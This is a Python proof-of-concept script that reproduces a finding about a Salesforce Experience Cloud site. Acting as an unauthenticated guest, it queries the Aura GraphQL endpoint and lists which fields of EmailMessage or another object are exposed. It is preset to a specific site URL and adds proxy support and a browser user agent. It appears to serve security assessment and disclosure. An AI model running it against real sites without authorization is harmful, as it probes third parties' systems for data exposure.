"""Quick standalone script to reproduce the EmailMessage 43-field finding.

Posts the GraphQL objectInfos query to the Aura endpoint as an unauthenticated
guest user.  Prints the field list returned by Salesforce.

Usage:
    python misc_scripts/sf_emailmessage_fields.py
    python misc_scripts/sf_emailmessage_fields.py --url https://other-site.my.site.com/s
    python misc_scripts/sf_emailmessage_fields.py --object Account
    python misc_scripts/sf_emailmessage_fields.py --proxy socks5h://localhost:1080
"""

import argparse
import json
import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_URL = "https://the companyusdirectsales.my.site.com/s"
AURA_PATHS = ["/sfsites/aura", "/s/sfsites/aura", "/aura"]

AURA_CONTEXT = json.dumps({
    "mode": "PROD",
    "fwuid": "guest",
    "app": "siteforce:communityApp",
    "loaded": {},
    "dn": [],
    "globals": {},
    "uad": False,
})


def build_payload(object_name: str) -> dict:
    query = (
        f'query q{{uiapi{{objectInfos(apiNames:["{object_name}"])'
        f"{{ApiName fields{{ApiName dataType reference}}}}}}}}"
    )
    return {
        "message": json.dumps({
            "actions": [{
                "id": "1;a",
                "descriptor": "aura://RecordUiController/ACTION$executeGraphQL",
                "callingDescriptor": "UNKNOWN",
                "params": {
                    "queryInput": {
                        "operationName": "q",
                        "query": query,
                        "variables": {},
                    }
                },
            }],
        }),
        "aura.context": AURA_CONTEXT,
        "aura.token": "undefined",
    }


def discover_aura_path(session: requests.Session, base_url: str) -> str | None:
    """Try known Aura paths and return the first one that responds with JSON."""
    for path in AURA_PATHS:
        url = f"{base_url}{path}"
        try:
            resp = session.post(url, data=build_payload("Account"), timeout=15)
            if resp.status_code == 200:
                resp.json()
                return path
        except (requests.RequestException, ValueError):
            continue
    return None


def main():
    parser = argparse.ArgumentParser(description="Reproduce EmailMessage field exposure finding")
    parser.add_argument("--url", default=DEFAULT_URL, help="Experience Cloud site base URL")
    parser.add_argument("--object", default="EmailMessage", help="Salesforce object to inspect (default: EmailMessage)")
    parser.add_argument("--proxy", help="SOCKS proxy, e.g. socks5h://localhost:1080")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")

    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
    })
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}

    # Discover aura endpoint
    print(f"Discovering Aura endpoint on {base_url} ...")
    aura_path = discover_aura_path(session, base_url)
    if not aura_path:
        print("ERROR: Could not find a working Aura endpoint. Site may be unreachable.")
        sys.exit(1)

    aura_url = f"{base_url}{aura_path}"
    print(f"Aura endpoint: {aura_url}\n")

    # Query objectInfos
    print(f"Querying objectInfos for {args.object} ...")
    payload = build_payload(args.object)
    try:
        resp = session.post(aura_url, data=payload, timeout=30)
    except requests.RequestException as e:
        print(f"ERROR: Request failed: {e}")
        sys.exit(1)

    if resp.status_code != 200:
        print(f"ERROR: HTTP {resp.status_code}")
        sys.exit(1)

    data = resp.json()
    action = data.get("actions", [{}])[0]

    if action.get("state") != "SUCCESS":
        print(f"ERROR: Action state = {action.get('state')}")
        if action.get("error"):
            print(json.dumps(action["error"], indent=2))
        sys.exit(1)

    rv = action.get("returnValue", {})
    if rv.get("errors"):
        print(f"GraphQL error: {rv['errors'][0].get('message', '')}")
        sys.exit(1)

    try:
        fields = rv["data"]["uiapi"]["objectInfos"][0]["fields"]
    except (KeyError, TypeError, IndexError):
        print("ERROR: Unexpected response structure")
        print(json.dumps(rv, indent=2))
        sys.exit(1)

    # Print results
    print(f"\n{'='*60}")
    print(f"  {args.object}: {len(fields)} fields accessible to guest user")
    print(f"{'='*60}\n")
    print(f"  {'#':<4} {'Field Name':<35} {'Type':<15} {'Reference'}")
    print(f"  {'-'*4} {'-'*35} {'-'*15} {'-'*9}")
    for i, f in enumerate(fields, 1):
        name = f.get("ApiName", "")
        dtype = f.get("dataType", "")
        ref = "Yes" if f.get("reference") else ""
        print(f"  {i:<4} {name:<35} {dtype:<15} {ref}")

    print(f"\nTotal: {len(fields)} fields")
    print("Note: This is metadata (schema introspection), not record data.")


if __name__ == "__main__":
    main()
